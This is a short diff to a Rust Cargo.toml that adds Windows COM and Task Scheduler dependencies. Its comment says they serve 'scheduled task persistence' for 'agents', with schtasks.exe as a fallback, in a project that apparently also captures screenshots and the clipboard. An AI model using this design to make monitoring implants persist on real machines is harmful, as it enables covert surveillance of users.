@@ -98,6 +98,15 @@ screenshots = "0.8"
 image = "0.24"
 arboard = "3.2"  # <-- Added for Clipboard
 
+# Windows COM (ITaskService — scheduled task persistence, MSVC native builds only).
+# MinGW / cross-compiled agents (x86_64-pc-windows-gnu) fall back to schtasks.exe.
+[target.'cfg(all(target_os = "windows", target_env = "msvc"))'.dependencies]
+windows = { version = "0.52", features = [
+    "Win32_Foundation",
+    "Win32_System_Com",
+    "Win32_System_TaskScheduler",
+] }
+
 [build-dependencies]
 serde_json = "1.0"
 hex = "0.4"
